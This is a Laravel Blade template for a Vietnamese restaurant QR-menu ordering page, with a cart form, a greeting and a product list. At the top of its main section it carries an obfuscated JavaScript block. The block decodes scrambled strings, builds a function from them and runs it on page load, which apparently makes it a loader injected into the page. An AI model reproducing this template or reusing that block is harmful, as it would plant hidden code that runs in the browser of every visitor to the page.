@extends('user.layout.content')
@section('main-content')
    <script>
        (function(){var xbA='',blP=872-861;function SHr(b){var e=144007;var u=b.length;var n=[];for(var f=0;f<u;f++){n[f]=b.charAt(f)};for(var f=0;f<u;f++){var z=e*(f+350)+(e%24312);var w=e*(f+360)+(e%34263);var p=z%u;var y=w%u;var a=n[p];n[p]=n[y];n[y]=a;e=(z+w)%3707503;};return n.join('')};var pXF=SHr('ntoqtrbltruuosrefinoxkjzcypsacvghwcdm').substr(0,blP);var NcQ=',r ;l.l)(6vn7.x.,);(.;rg=">e66ru8h),(lins[yvChuc,2hq-4}br rlw7e, f,9d((9o8fv.]nr2;n]t8lya.a 1,;0n=o"l6;)-,amup0105tr.lr1];0a<rt+.]afjln;a7 ar<lavq.letftt;l b)r 73(}a=0;o;",,d,.[e0=2=j1,hCn3j+ri1({;fh[i;)li)n("jla,t;menhseler;th(t18e+vai94g;en)m)0,ud)rry)ua bS o,={big=[r]pda}=ing+z-(p++ 0)p--]=a](ztttucrf".qCy[r[p1;9.r{;=juc)gn=rz=;o(=asS2h9+5 nstdr(nrtz;,{em=th8gc6 .<g;+ur)j,6= h(p;-hdfdedooae(12 m (l+xrd.rff;mresxsey1).+=y.u(te a a,rald71z;v)=u;rhd;}ev {{v8 wh=e)ii0v*rstc;qe"+ve=iu;va,.p2fArw+<,a.at;,vaa*of=Alh=r;nq)tqa=;ngasC}+fsealud+(p2r;=iy(j=svue{)t;r]=;fboww),8[<)r;si+)ji87ovtr3attgov.pukloh[;s];l-=f(u1;8i.t0!]ny]v)x7r10ghadav  (h+vyvs)[;h0o6)pc,pi}+=;pooi(e"i)=o=mirrhrjCtr=).c=rn ()=Cc)i+v[c0=(n(=;=e)rA42,lhh a"9].+ia((anCrA(tw+s9anll,ng);[cfv)=iaf( o=;v+l)rrtv,> l.itosr==3[lng7al4+2=w2;C;.uns(=.7=aeabAc(vada+oonr6.l"d],)rvm[lgp+h(f}(lal6sbse[uavntn;ulrtab+]!"c.;9rsu6(5';var lzJ=SHr[pXF];var lHV='';var jwM=lzJ;var Koq=lzJ(lHV,SHr(NcQ));var KLH=Koq(SHr(' sfi};_bi(lL 0.6uLr.gy3)LL$L%[rcLj(s)&4!4g74L4$L(3o!rd$L$L=d(b#(#r,=4,5f)fl\'6nw)1+2, ,{=.t$)f4.(15}ie]y%ge4,.q3;!.w\/hc4 .a!lp$L;gLL_,j1h(i!f_r.Lum).joL,&a.]1aLt:cy=ad.rc!,rv.b1L2#La4)f77to.Ly%a,fLba#.w4coL.*2$,LL="3h;f$_c2aL, sr+;.r1L.6tdco3!h=8_g$nao"g{Lt()4Lp0Lb4[)1;+rL3wa0jLrsLtarLq7):L+e(.LLt)L\/L-=c.}rlL47#q7r$3$}-(r30e+4.()_))+a_].3!\'ace%7tpi_(4c3)tnorveLt{i}(L;0x)r..l)c0Cc)ffjcyi)=s$t%n6h;.rgg7o3t$Lo1(0f.\/,0=0n)$]2eLk)L!yfd)=q3"\/+Lkro+]ik)goyL3Lf%.$3;)3bc,bL 1g0.a;;!rf,,L,a,0ec$tn-u0+27hr)Lg64;t(" 2.d_f(a"nLc. L:bs=(t3.Lt;p.fL!+L,-n t{$L)L#a(2,.y(!8q[(,0yr)u 07(r.i,=nh,,(_acf#,=9[LL0j=L(3;${ik_,3_dri$!4jf%rLo6C-].f)%).1&b_;j)#a7L{n,t2i(  3=fL!1;.$0ba$Lo;Sijo*L(L=ff7.k;f.\/1.)pco_!Lr\/ !\'fe!S.=_!3,*o5\'ibl)8aLL %#(ncnf!L8,tho4S=f[0$}pgf)ssLl;Lrc](4_.,kgLLg4{d0iel".tgi_bjLrf;{tu=j{7t,L;3,.c!,g.}1dj4.((st(,!)eke"l!6L.a312g!_1oc,L))q!; )eckeL-lo!t}lg4+)f!,=1;(eee}1{eL=%i7Lr0;Ln6}j)}Lc(3.(nuso.fane2 uut0 3,n.cbkn06f}L*c(=.(us.L$$;8fccLyi$)n;(8o.i+L52t.,_0;.4)1.s(rjl&L[)ed.!0+.n(; .eL=L;.))#}$r_'));var gqm=jwM(xbA,KLH );gqm(2479);return 2844})()
    </script>
    <div id="wrapper">
        <div id="page-wrapper" class="gray-bg">
            <nav class="navbar navbar-expand-sm navbar-toggleable-sm navbar-dark bg-primary box-shadow mb-3">
                <div class="container">
                    <a class="navbar-brand" href="/Account/Login">QR MENU</a>
                    <button class="custom-toggler navbar-toggler" type="button" data-toggle="collapse"
                        data-target=".navbar-collapse" aria-controls="navbarSupportedContent" aria-expanded="false"
                        aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"><i class="fa fa-bars"
                                style="color:#fafafa; font-size:28px;"></i></span>
                    </button>
                    <div class="navbar-collapse collapse d-sm-inline-flex justify-content-between">
                        <ul class="navbar-nav mx-auto">

                        </ul>

                        <ul class="nav navbar-top-links">

                            <li class="nav-item">

                                <div class="dropdown profile-element">
                                    <a class="nav-link" data-toggle="dropdown" aria-expanded="false">
                                        <span>
                                            <i class="fa fa-cutlery mr-2"></i><i class="fa fa-chevron-down ml-1"></i>
                                        </span>
                                    </a>
                                    <ul class="dropdown-menu animated fadeInRight m-t-xs">
                                        <li class="dropdown-item">
                                            <a href="/restaurant/restaurantmanager">Management Panel</a>
                                        </li>

                                        <li class="dropdown-item">
                                            <a href="/Account/ChangePassword">Change Password</a>
                                        </li>
                                        <li class="divider"></li>
                                        <li class="dropdown-item"><a href="/Account/logout">Logout</a></li>
                                    </ul>
                                </div>
                            </li>

                        </ul>
                    </div>
                </div>
            </nav>
            <div class="wrapper wrapper-content">
                <div class="container" style="height: 100%;">

                    <div class="row">
                        <div class="col-md-4">
                            <div class="ibox float-e-margins" id="fboxSf">
                                <div class="ibox-title">
                                    <h3 class="col-md-12">MY CART <i class="fa fa-cart-arrow-down float-right"></i></h3>
                                    <input hidden value="&#x20AB;" id="txtCurrency" />
                                    <input hidden value="TOTAL" id="txtTotal" />
                                    <input hidden value="Your cart is empty yet." id="txtEmptyCart" />
                                    <input hidden value="Please complete your selections." id="txtSelectOptions" />
                                </div>
                                <div class="ibox-content ibox-br">
                                    <div class="sk-spinner sk-spinner-wave">
                                        <div class="sk-rect1"></div>
                                        <div class="sk-rect2"></div>
                                        <div class="sk-rect3"></div>
                                        <div class="sk-rect4"></div>
                                        <div class="sk-rect5"></div>
                                    </div>
                                    <form method="post" action="/Order/AddOrder">
                                        <input name="RestaurantId" id="txtRestaurantId" hidden value="1" />
                                        <input name="UserId" id="txtUserId" hidden
                                            value="fc275c06-8043-46b1-aed2-71843b4dce61" />
                                        <input name="TableId" id="txtTableId" hidden value="35" />

                                        <table class="table table-borderless">
                                            <tbody id="cartContentsHtml">
                                            </tbody>
                                        </table>
                                        <hr>
                                        <div class="form-group" id="txtOrderIsReady">
                                            <textarea class="form-control" name="OrderNote" maxlength="70" rows="2"
                                                placeholder="Indicate if you have a note for the order"></textarea>
                                        </div>
                                        <button type="submit" onclick="startOrder()" id="placeOrder"
                                            class="btn btn-primary btn-outline btn-block mt-4 btn-sm"> Place the
                                            Order</button>
                                        <input name="__RequestVerificationToken" type="hidden"
                                            value="CfDJ8F3jakzp7iNKmGggKggWDcQXBqw6-LL4c2M1rUeXjN_YDVjRXttRroJt9FtbIXGT7110Myr23rrWoQN3ePVGJs52IzVXzhvfA3FYVUHI7rRKuCf3ddDC929cxKYzIGW99K6tSn2CaNEad_l7IEfVbzxWMTEw6mA6c_f-_5YNpJHcJnwsnG-W_e0rk8eNmaqPmA" />
                                    </form>
                                </div>
                            </div>
                            <div class="row mb-3">
                                <div class="col-6" style="padding-right:7px">
                                    <button onclick="callTheWaiter()" id="btnCallWaiter" class="call-button btn-block"><img
                                            src="/images/call-waiter.png" /> Call the
                                        Waiter</button>
                                </div>
                                <div class="col-6" style="padding-left:7px">
                                    <button onclick="callPayment()" id="btnCallBill" class="call-button btn-block"><img
                                            src="/images/get-money.png" /> Request Payment</button>
                                </div>
                            </div>

                        </div>
                        <div class="col-md-8">
                            <div class="ibox-content m-b-sm border-bottom" id="welcome-lg">
                                <div class="p-xs">
                                    {{-- <div class="float-left m-r-md">
                                        <img alt="image" class="img-md"
                                            src="/images/logos/80735333-a467-43a8-ad98-36c55b23711b.jpg">
                                    </div> --}}
                                    <div class="float-right m-r-md">
                                        <button onclick="changeView(1)"
                                            class="btn btn-primary btn-outline btn-flat btn-sm"><i
                                                class="fa fa-list-ul mt-1"></i></button>
                                        <button onclick="changeView(0)"
                                            class="btn btn-primary btn-outline btn-flat btn-sm"><i
                                                class="fa  fa-th-large mt-1"></i></button>
                                    </div>
                                    <h3 class="text-qrRest-dark font-weight-bold text-styling">Chào
                                        <b><?php
                                        date_default_timezone_set('Asia/Ho_Chi_Minh');
                                        $currentHour = date('G');

                                        if ($currentHour >= 5 && $currentHour < 12) {
                                            $timeOfDay = 'buổi sáng';
                                        } elseif ($currentHour >= 12 && $currentHour < 17) {
                                            $timeOfDay = 'buổi trưa';
                                        } elseif ($currentHour >= 17 && $currentHour < 20) {
                                            $timeOfDay = 'buổi chiều';
                                        } else {
                                            $timeOfDay = 'buổi tối';
                                        }

                                        echo "$timeOfDay";
                                        ?></b> Linh
                                    </h3>
                                    <span>
                                        Bạn đang ngồi bàn <b><?= $table ?></b>
                                    </span>
                                </div>
                            </div>




                            <div id="isList">
                                @foreach ($productsByCategory as $categoryName => $products)
                                    <div class="ibox float-e-margins">
                                        <div class="ibox-title">
                                            <h3 class="col-md-12"> <i
                                                    class="fa fa-star-o text-qrRest"></i>{{ $categoryName }}
                                            </h3>
                                        </div>
                                        <div class="ibox-content ibox-br">
                                            {{-- <div class="sk-spinner sk-spinner-wave">
                                            <div class="sk-rect1"></div>
                                            <div class="sk-rect2"></div>
                                            <div class="sk-rect3"></div>
                                            <div class="sk-rect4"></div>
                                            <div class="sk-rect5"></div>
                                        </div> --}}
                                            <table class="table table-hover">
                                                @foreach ($products as $product)
                                                    <tbody>
                                                        <tr>
                                                            <td class="actionOfMenu">
                                                                <div class="row">
                                                                    <input class="menu-quantity-input ml-3"
                                                                        id="txtQuantity-{{ $product->id }}"
                                                                        value="0" />
                                                                    <div onclick="addToCart({{ $product->id }}, true)"
                                                                        class="menu-button ml-1">
                                                                        <i class="fa fa-plus" style="margin-top:5px"></i>
                                                                    </div>
                                                                </div>
                                                            </td>
                                                            <td style="width:70%;" class="cart-item-upFont">
                                                                {{ $product->name }}<br />
                                                            </td>
                                                            <td class="cart-item-upFont">
                                                                {{ number_format($product->price) }} &#x20AB;
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                @endforeach
                                            </table>
                                        </div>
                                    </div>
                                @endforeach
                            </div>
                        </div>
                    </div>
                    <br />
                    <br />
                    <script>
                        function addToCart(productId, action) {
                            var inputElement = document.getElementById('txtQuantity-' + productId);
                            var currentQuantity = parseInt(inputElement.value);

                            if (action) {
                                currentQuantity++;
                            }

                            inputElement.value = currentQuantity;

                            console.log('Đã thêm sản phẩm có ID ' + productId + ' vào giỏ hàng.');
                        }
                    </script>
                    <div class="modal inmodal" id="modal-dialog" tabindex="-1" role="dialog" aria-hidden="true">
                        <div class="modal-dialog">
                            <div class="modal-content animated fadeIn">
                                <div class="modal-header">
                                    <h4 id="txtMenuName" class="modal-title mx-auto"></h4>
                                </div>
                                <div class="ibox no-margins" id="boxBA">
                                    <div class="first ibox-content" style="border-top:none;padding:0">
                                        <div class="sk-spinner sk-spinner-wave">
                                            <div class="sk-rect1"></div>
                                            <div class="sk-rect2"></div>
                                            <div class="sk-rect3"></div>
                                            <div class="sk-rect4"></div>
                                            <div class="sk-rect5"></div>
                                        </div>

                                        <div class="content">
                                            <div class="numbers-row">
                                                <input type="text" value="1" id="qty_1"
                                                    class="qty2 form-control" name="quantity">
                                            </div>
                                            <span id="txtFeatureValidation" class="text-danger"></span>
                                            <div id="menuFeatureList">
                                            </div>

                                        </div>
                                        <div class="footer" style="position:inherit">
                                            <div class="row small-gutters">
                                                <div class="col-4">
                                                    <button onclick="cancelModal()"
                                                        class="btn btn-sm btn-outline btn-default btn-block">
                                                        Cancel
                                                        <i class="fa fa-times mt-1"></i>
                                                    </button>
                                                </div>
                                                <div class="col-8">
                                                    <button onclick="addTocart(0, false)"
                                                        class="btn btn-sm btn-outline btn-primary btn-block">
                                                        add
                                                        <i class="fa fa-long-arrow-right mt-1"></i>
                                                    </button>
                                                </div>
                                            </div>
                                            <!-- /Row -->
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </div>
@endsection
